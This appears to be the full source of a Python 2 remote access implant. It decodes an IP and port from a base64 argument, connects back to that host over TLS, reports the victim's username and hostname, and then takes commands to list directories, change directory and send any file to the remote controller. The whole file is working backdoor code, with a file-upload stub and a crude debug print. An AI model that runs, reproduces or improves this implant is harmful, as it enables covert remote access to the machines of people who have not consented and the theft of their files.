#!/usr/bin/python
import json, os, base64, sys, socket, ssl, getpass
from os.path import expanduser
home = expanduser("~")
os.chdir(home)
# setup
args = json.loads(base64.b64decode(sys.argv[1]))
host, port = args['ip'], int(args['port'])
# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock = ssl.wrap_socket(s)
sock.connect((host, port))
# Send computer name
username = getpass.getuser()
sock.send(username + "@" + socket.gethostname())


def change_dir(path):
	if not path:
		os.chdir(home)
	elif os.path.exists(path) == False:
		sock.send(path + ": No such file or directory")
	else:
		os.chdir(path)
	sock.send(term)


def pwd():
	sock.send(os.getcwd())
	sock.send(term)	


def list_dir(path):
	results = dict()
	if not path:
		path = "."
	if os.path.exists(path) == False:
		sock.send(path + ": No such file or directory")
	else:
		result = ""
		try:
			for v in os.listdir(path):
				if os.path.isdir(os.path.join(path,v)):
					results[v] = 10
				else:
					results[v] = 0
			sock.send(json.dumps(results))
		except Exception as e:
			sock.send(str(e))
	sock.send(term)


def tab_complete(path):
	global term
	results = {}
	for v in os.listdir(path):
		if os.path.isdir(os.path.join(path,v)):
			results[v] = 10
		else:
			results[v] = 0
	sock.send(json.dumps(results))
	sock.send(term)


def send_file(path):
	global term
	if os.path.exists(path):
		if os.path.isdir(path):
			sock.send(json.dumps({"status":2}))
		else:
			f = open(path,"rb")
			data = f.read()
			sock.send(json.dumps({"status":1,"size":len(data)}))
			sock.send(term)
			term = sock.recv(10)
			print "sending data"
			sock.send(data)
			sock.send(term)
			return
	else:
		sock.send(json.dumps({"status":0}))
	sock.send(term)


def receive_file(args):
	global term
	print "fuck yeah"
	sock.send(term)


# SETUP
while 1:
	global term
	cmd_data = json.loads(sock.recv(128))
	cmd = cmd_data['cmd']
	args = cmd_data['args']
	term = cmd_data['term']

	if cmd == "cd":
		change_dir(args)
	elif cmd == "ls":
		list_dir(args)
	elif cmd == "download":
		send_file(args)
	elif cmd == "upload":
		receive_file(args)
	elif cmd == "tab_complete":
		tab_complete(args)
	elif cmd == "pwd":
		pwd()
	else:
		sock.send('exec')
		sock.send(term)

